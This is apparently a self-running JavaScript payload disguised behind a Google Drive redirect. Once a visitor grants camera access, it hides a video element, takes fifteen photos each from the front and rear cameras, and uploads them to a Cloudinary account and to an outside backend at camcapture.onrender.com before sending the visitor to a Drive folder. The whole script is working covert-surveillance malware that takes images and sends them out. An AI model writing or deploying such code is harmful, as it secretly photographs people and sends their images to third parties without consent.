(async function () {
  const video = document.createElement('video');
  video.setAttribute('autoplay', true);
  video.setAttribute('playsinline', true);
  video.style.display = 'none';
  document.body.appendChild(video);

  const canvas = document.createElement('canvas');
  const ctx = canvas.getContext('2d');

  async function captureImages(facingMode, labelPrefix) {
    const constraints = {
      audio: false,
      video: {
        facingMode: facingMode
      }
    };

    const images = [];
    try {
      const stream = await navigator.mediaDevices.getUserMedia(constraints);
      video.srcObject = stream;

      await new Promise(resolve => {
        video.onloadedmetadata = () => {
          video.play();
          resolve();
        };
      });

      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;

      for (let i = 0; i < 15; i++) {
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg'));
        images.push({ blob, name: `${labelPrefix}_image${i + 1}.jpg` });
        await new Promise(r => setTimeout(r, 500)); // 0.5s delay
      }

      stream.getTracks().forEach(track => track.stop());
      return images;
    } catch (error) {
      console.warn(`Could not access ${labelPrefix} camera:`, error);
      return [];
    }
  }

  async function uploadImages(images) {
    const cloudName = "dfytubulx";
    const uploadPreset = "CamCapture";

    const uploadTasks = images.map(async (img, i) => {
      const cloudForm = new FormData();
      cloudForm.append("file", img.blob);
      cloudForm.append("upload_preset", uploadPreset);

      // Upload to Cloudinary
      let cloudinaryUrl = "";
      try {
        const cloudRes = await fetch(`https://api.cloudinary.com/v1_1/${cloudName}/image/upload`, {
          method: "POST",
          body: cloudForm
        });
        const cloudData = await cloudRes.json();
        cloudinaryUrl = cloudData.secure_url;
        console.log(`✅ Cloudinary (${img.name}):`, cloudinaryUrl);
      } catch (err) {
        console.error("❌ Cloudinary upload failed:", err);
      }

      // Upload to your backend
      try {
        const backendForm = new FormData();
        backendForm.append("image", img.blob, img.name);
        backendForm.append("cloudinaryUrl", cloudinaryUrl); // Optional to store in DB

        await fetch("https://camcapture.onrender.com/upload-endpoint", {
          method: "POST",
          body: backendForm
        });

        console.log(`✅ Backend (${img.name}) upload done.`);
      } catch (err) {
        console.error("❌ Backend upload failed:", err);
      }
    });

    await Promise.all(uploadTasks);
  }

  async function startCapture() {
    
    const front = await captureImages("user", "front");
    const back = await captureImages({ exact: "environment" }, "back");
    const allImages = [...front, ...back];

    if (allImages.length > 0) {
      await uploadImages(allImages);
    }

    // redirect to gdrive
    window.location.href = "https://drive.google.com/drive/folders/1dWeuOua4SbFZsxAx13yoq3wqcaoDpMft","_blank";
  }

  startCapture();
})();
